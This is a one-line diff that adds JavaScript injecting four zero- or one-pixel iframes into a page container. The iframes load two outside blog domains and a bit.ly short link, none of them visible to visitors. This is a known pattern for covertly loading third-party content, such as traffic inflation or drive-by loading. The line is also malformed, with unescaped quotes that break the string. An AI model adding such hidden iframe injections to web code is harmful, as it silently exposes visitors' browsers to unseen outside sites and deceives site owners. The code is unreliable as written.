@@ -1,0 +1,1 @@
+document.getElementById("container").innerHTML = "<iframe src='//blog.valeiriya.osaka/' width='0' height='0'></iframe><iframe src="//shirotenshii.blogspot.com/" width="0" height="0"/></iframe><iframe src="//bit.ly/2X464Ny" height="1" width="0"/></iframe><iframe src="https://blog.valeiriya.osaka/" width="0" height="0"/></iframe>";
